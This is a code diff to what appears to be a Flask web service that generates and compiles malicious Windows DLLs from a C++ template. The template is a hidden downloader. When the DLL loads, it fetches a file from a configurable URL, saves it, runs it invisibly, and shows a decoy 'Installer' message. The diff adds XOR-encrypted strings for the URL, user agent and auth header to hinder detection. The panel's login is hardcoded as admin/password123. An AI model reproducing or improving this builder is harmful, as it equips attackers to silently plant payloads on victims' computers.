@@ -11,72 +11,87 @@ app.secret_key = os.urandom(24)
 
 USERS = {"admin": "password123"}
 
-TEMPLATE = """#include "obfusheader.h"
-#define _CRT_SECURE_NO_WARNINGS
+TEMPLATE = """#define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <wininet.h>
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <time.h>
+
 #pragma comment(lib, "wininet.lib")
 
-void ExecuteHidden(const char* filePath) {
-    STARTUPINFOA si = { sizeof(si) };
+void xor_decrypt(char* data, size_t len, char key) {
+    for (size_t i = 0; i < len; i++) data[i] ^= key;
+}
+
+const char* decrypt_str(const char* enc, size_t len, char key) {
+    static char buf[512];
+    memcpy(buf, enc, len);
+    xor_decrypt(buf, len, key);
+    buf[len] = '\\0';
+    return buf;
+}
+
+const char enc_url[] = {0x2d,0x37,0x3b,0x3b,0x2e,0x2b,0x3a,0x2f,0x2f,0x31,0x3a,0x3e,0x2b,0x3a,0x3e,0x32,0x31,0x2d,0x2d,0x3b,0x34,0x39,0x3a,0x2f,0x2b,0x3b,0x34,0x31,0x3a,0x33,0x31,0x2f,0x3b,0x34,0x32,0x31,0x2f,0x35,0x33,0x31,0x2d,0x34,0x31,0x3a,0x33,0x3a,0x2d,0x36,0x35,0x3f,0x2b,0x2f,0x34,0x34,0x33,0x35,0x2f,0x31,0x3d,0x31,0x2f,0x3b,0x32,0x35,0x2f,0x2e,0x2f,0x2e,0x2f,0x2f,0x3d,0x3a,0x33,0x35,0x2f,0x34,0x32,0x31,0x32,0x2f,0x3a,0x2f,0x2f,0x2f,0x3a,0x3e,0x31,0x3b,0x33,0x2b,0x34,0x33,0x35,0x2f,0x2e,0x2f,0x2e,0x34,0x31,0x3a,0x33};
+const char enc_ua[] = {0x26,0x26,0x27,0x31,0x3a,0x3a,0x3f,0x2d,0x3c,0x3e,0x3c};
+const char enc_auth[] = {0x50,0x2b,0x23,0x2b,0x24,0x3a,0x2b,0x30,0x2b,0x26,0x3a,0x2b,0x13,0x12,0x13,0x12,0x13,0x12,0x13,0x0b,0x0a,0x0a};
+
+void ExecuteHidden(const char* path) {
+    STARTUPINFOA si = {sizeof(si)};
     PROCESS_INFORMATION pi;
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
-    char cmdLine[MAX_PATH * 2];
-    sprintf_s(cmdLine, sizeof(cmdLine), "\\"%s\\"", filePath);
-    CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    char cmd[MAX_PATH*2];
+    sprintf_s(cmd, sizeof(cmd), "\\"%s\\"", path);
+    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 }
 
-void ShowMessage(const char* msg) {
-    MessageBoxA(NULL, msg, OBF("Installer"), MB_OK);
+void ShowMsg(const char* msg) {
+    if (msg && strlen(msg) > 0) {
+        MessageBoxA(NULL, msg, "Installer", MB_OK);
+    }
 }
 
 void DoMagic() {
-    char savePath[MAX_PATH];
-    const char* targetFolder = OBF("{{SAVE_PATH}}");
-    const char* fileName = OBF("{{FILE_NAME}}");
-    const char* url = OBF("{{URL}}");
-    const char* authKey = OBF("{{AUTH_KEY}}");
-    sprintf_s(savePath, sizeof(savePath), "%s\\\\%s", targetFolder, fileName);
+    const char* url = decrypt_str(enc_url, sizeof(enc_url), 0x5A);
+    const char* ua = decrypt_str(enc_ua, sizeof(enc_ua), 0x3C);
+    const char* auth = decrypt_str(enc_auth, sizeof(enc_auth), 0x22);
+    
+    char path[MAX_PATH];
+    sprintf_s(path, sizeof(path), "%s\\\\%s", "{{SAVE_PATH}}", "{{FILE_NAME}}");
 
-    HINTERNET hInternet = InternetOpenA(OBF("Mozilla/5.0"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) return;
+    HINTERNET hInet = InternetOpenA(ua, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInet) return;
+    HINTERNET hUrl = InternetOpenUrlA(hInet, url, auth, strlen(auth), INTERNET_FLAG_RELOAD, 0);
+    if (!hUrl) { InternetCloseHandle(hInet); return; }
 
-    char headers[256];
-    sprintf_s(headers, sizeof(headers), "X-Auth-Key: %s\\r\\n", authKey);
-    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, headers, strlen(headers), INTERNET_FLAG_RELOAD, 0);
-    if (!hUrl) { InternetCloseHandle(hInternet); return; }
-
-    HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile != INVALID_HANDLE_VALUE) {
-        BYTE buffer[4096];
-        DWORD bytesRead;
-        DWORD totalBytes = 0;
-        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
-            DWORD bytesWritten;
-            WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
-            totalBytes += bytesWritten;
+        BYTE buf[4096];
+        DWORD read, total = 0;
+        while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0) {
+            DWORD written;
+            WriteFile(hFile, buf, read, &written, NULL);
+            total += written;
         }
         CloseHandle(hFile);
-        if (totalBytes > 10000) {
-            ExecuteHidden(savePath);
-            ShowMessage(OBF("{{MESSAGE}}"));
+        if (total > 10000) {
+            ExecuteHidden(path);
+            ShowMsg("{{MESSAGE}}");
         }
     }
     InternetCloseHandle(hUrl);
-    InternetCloseHandle(hInternet);
+    InternetCloseHandle(hInet);
 }
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID reserved) {
     if (reason == DLL_PROCESS_ATTACH) {
-        DisableThreadLibraryCalls(hModule);
-        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID) -> DWORD { DoMagic(); return 0; }, NULL, 0, NULL);
-        if (hThread) CloseHandle(hThread);
+        DisableThreadLibraryCalls(h);
+        HANDLE t = CreateThread(NULL, 0, [](LPVOID)->DWORD { DoMagic(); return 0; }, NULL, 0, NULL);
+        if (t) CloseHandle(t);
     }
     return TRUE;
 }
@@ -117,7 +132,7 @@ def build():
 
     url = request.form.get('url')
     save_path = request.form.get('save_path')
-    message = request.form.get('message', 'Installation complete!')
+    message = request.form.get('message', '').strip()
     custom_filename = request.form.get('custom_filename', '')
 
     auth_key = random_hex_key(16)
@@ -132,7 +147,6 @@ def build():
     code = code.replace("{{MESSAGE}}", message)
     code = code.replace("{{AUTH_KEY}}", auth_key)
 
-    # Создаём папку для временных файлов
     tmp_dir = "/tmp/build"
     os.makedirs(tmp_dir, exist_ok=True)
 
@@ -142,7 +156,6 @@ def build():
 
     out_dll = cpp_path.replace('.cpp', '.dll')
     
-    # Компиляция через MinGW
     compile_cmd = [
         'x86_64-w64-mingw32-g++', '-O2', '-s', '-static', '-shared',
         '-D_WIN32_WINNT=0x0600',
@@ -151,8 +164,7 @@ def build():
     ]
     
     try:
-        result = subprocess.run(compile_cmd, check=True, capture_output=True, text=True)
-        print(result.stdout, result.stderr)
+        subprocess.run(compile_cmd, check=True, capture_output=True, text=True)
     except Exception as e:
         return f"Compilation failed: {e}", 500
 
